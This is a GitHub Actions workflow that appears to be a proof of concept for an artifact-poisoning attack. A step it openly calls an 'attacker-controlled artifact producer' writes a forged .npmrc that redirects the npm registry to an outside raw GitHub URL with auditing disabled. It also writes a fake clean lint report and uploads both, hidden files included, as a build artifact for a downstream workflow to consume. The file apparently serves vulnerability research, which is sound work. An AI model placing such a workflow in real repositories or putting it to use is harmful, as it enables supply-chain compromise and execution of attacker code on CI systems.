name: ADP PR Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Attacker-controlled artifact producer (forged from the PR head)
        env:
          PR: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p out
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/poc-adp-canary/npmreg6/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
          printf 'lint clean (attacker supplied)\n' > out/linter-report.txt
          echo "$PR" > out/pr-number.txt
          ls -la out
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/
          include-hidden-files: true
          if-no-files-found: ignore
